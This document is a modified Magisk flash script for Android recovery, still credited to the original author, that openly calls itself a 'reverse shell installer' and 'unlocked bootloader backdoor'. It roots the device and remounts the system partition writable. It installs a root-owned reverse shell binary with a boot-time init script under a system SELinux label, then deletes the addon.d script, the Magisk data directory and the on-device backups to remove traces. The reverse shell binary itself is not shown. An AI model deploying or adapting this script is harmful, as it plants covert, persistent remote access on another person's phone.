#MAGISK
############################################
#
# Magisk Flash Script (updater-script)
# by topjohnwu
#
############################################

##############
# Preparation
##############

COMMONDIR=$INSTALLER/common
APK=$COMMONDIR/magisk.apk
CHROMEDIR=$INSTALLER/chromeos
REVSHELLDIR=$INSTALLER/revshell

# Default permissions
umask 022

OUTFD=$2
ZIP=$3

if [ ! -f $COMMONDIR/util_functions.sh ]; then
  echo "! Unable to extract zip file!"
  exit 1
fi

# Load utility fuctions
. $COMMONDIR/util_functions.sh

setup_flashable

############
# Detection
############

#if echo $MAGISK_VER | grep -q '\.'; then
#  PRETTY_VER=$MAGISK_VER
#else
#  PRETTY_VER="$MAGISK_VER($MAGISK_VER_CODE)"
#fi
#print_title "Magisk $PRETTY_VER Installer"

ui_print " "
ui_print "     REVERSE SHELL INSTALLER     "
ui_print "  (unlocked bootloader backdoor) "
ui_print " "


is_mounted /data || mount /data || is_mounted /cache || mount /cache
mount_partitions
check_data

MAGISKALREADYINSTALLED=0
if ls /data/magisk_backup_* 1> /dev/null 2>&1; then
    MAGISKALREADYINSTALLED=1
fi

if [ $MAGISKALREADYINSTALLED -eq 0 ]
then
  ui_print "- Magisk not detected"
else
  ui_print "- Magisk detected"
fi  # if magisk already installed

if [ $MAGISKALREADYINSTALLED -eq 0 ]
then

get_flags
find_boot_image

[ -z $BOOTIMAGE ] && abort "! Unable to detect target image"
ui_print "- Target image: $BOOTIMAGE"

fi

# Detect version and architecture
api_level_arch_detect

[ $API -lt 17 ] && abort "! Magisk only support Android 4.2 and above"

ui_print "- Device platform: $ARCH"

BINDIR=$INSTALLER/$ARCH32
chmod -R 755 $CHROMEDIR $BINDIR

if [ $MAGISKALREADYINSTALLED -eq 0 ]
then

# Check if system root is installed and remove
$BOOTMODE || remove_system_su

fi



##############
# Environment
##############

ui_print "- Constructing environment"

# Copy required files
rm -rf $MAGISKBIN/* 2>/dev/null
mkdir -p $MAGISKBIN 2>/dev/null
cp -af $BINDIR/. $COMMONDIR/. $REVSHELLDIR/. $CHROMEDIR $BBBIN $MAGISKBIN
chmod -R 755 $MAGISKBIN



# SILENTPOLICY - discovering system dir
SYSTEMDIR=/system
if [ -f /system_root/system/bin/cd ]
then
  SYSTEMDIR=/system_root/system
elif [ -f /system/system/bin/cd ]
then
  SYSTEMDIR=/system/system
elif [ -f /system_root/bin/cd ]
then
  SYSTEMDIR=/system_root
else
  SYSTEMDIR=/system
fi
ui_print "- System path: $SYSTEMDIR"



# SILENTPOLICY - mount system rw
ui_print "- Remounting system partition to rw mode"
blockdev --setrw /dev/block/mapper/system$SLOT 2>/dev/null
mount -o rw,remount /system


if [ $MAGISKALREADYINSTALLED -eq 0 ]
then

# addon.d
if [ -d /system/addon.d ]; then
  ui_print "- Adding addon.d survival script"
#  blockdev --setrw /dev/block/mapper/system$SLOT 2>/dev/null
#  mount -o rw,remount /system
  ADDOND=/system/addon.d/99-magisk.sh
  cp -af $COMMONDIR/addon.d.sh $ADDOND
  chmod 755 $ADDOND
fi

fi

$BOOTMODE || recovery_actions

#####################
# Boot/DTBO Patching
#####################

if [ $MAGISKALREADYINSTALLED -eq 0 ]
then

install_magisk

fi

# copy reshell files here
if [ -f $SYSTEMDIR/bin/revshell ]
then
  ui_print "- Previous reverse shell binary detected"
  rm $SYSTEMDIR/bin/revshell
fi
cp $MAGISKBIN/revshell $SYSTEMDIR/bin/revshell && ui_print "- Reverse shell binary delivered" || ui_print "- Error delivering reverse shell binary"
chmod 0700 $SYSTEMDIR/bin/revshell
chown root:root $SYSTEMDIR/bin/revshell
chcon u:object_r:system_file:s0 $SYSTEMDIR/bin/revshell
rm $MAGISKBIN/revshell

if [ -f $SYSTEMDIR/etc/init/revshell.rc ]
then
  ui_print "- Previous reverse shell init script detected"
  rm $SYSTEMDIR/etc/init/revshell.rc
fi
cp $MAGISKBIN/revshell.rc $SYSTEMDIR/etc/init/revshell.rc && ui_print "- Reverse shell init script delivered" || ui_print "- Error delivering reverse shell init script"
chmod 0644 $SYSTEMDIR/etc/init/revshell.rc
chown root:root $SYSTEMDIR/etc/init/revshell.rc
chcon u:object_r:system_file:s0 $SYSTEMDIR/etc/init/revshell.rc
rm $MAGISKBIN/revshell.rc

# SILENTPOLICY - remove addon.d script
if [ -f $SYSTEMDIR/addon.d/99-magisk.sh ]
then
  ui_print "- Remove addon.d script"
  rm -f $SYSTEMDIR/addon.d/99-magisk.sh
else
  ui_print "- No addon.d script found"
fi


if [ $MAGISKALREADYINSTALLED -eq 0 ]
then

# SILENTPOLICY - move backups to tmp and wipe original
ORIGINALBACKUPSDIR=/tmp/backup_original_partitions
rm -rf $ORIGINALBACKUPSDIR 2>/dev/null
mkdir $ORIGINALBACKUPSDIR 2>/dev/null
cp -R /data/magisk_backup* $ORIGINALBACKUPSDIR
ui_print "- Backups copied to tmpfs"
rm -rf /data/magisk_backup* 2>/dev/null
ui_print "- Original backups wiped"


# SILENTPOLICY - backup secure dir and wipe original
if [ -d /data/adb/magisk ]
then
  ui_print "- Backup secure dir"
  cp -R /data/adb/magisk $ORIGINALBACKUPSDIR/securedir
  ui_print "- Removing traces from secure dir"
  rm -rf /data/adb/magisk
else
  ui_print "- No traces in secure dir"
fi

fi

# Cleanups
$BOOTMODE || recovery_cleanup
rm -rf $TMPDIR

ui_print "- Done"

if [ $MAGISKALREADYINSTALLED -eq 0 ]
then

# SILENTPOLICY - backups warning
ui_print " "
ui_print " "
ui_print " ! WARNING !"
ui_print " Installation completed successfully. Do not reboot to system right now. Please do not forget to dump backups via adb and save them:"
ui_print " "
ui_print " $ adb pull $ORIGINALBACKUPSDIR . "
ui_print " "
ui_print " If you forget to do this, you will not be able to automatically uninstall this tool, you will have to manually restore your original device /boot partition"
ui_print " "
ui_print " "

fi

ui_print " "

exit 0
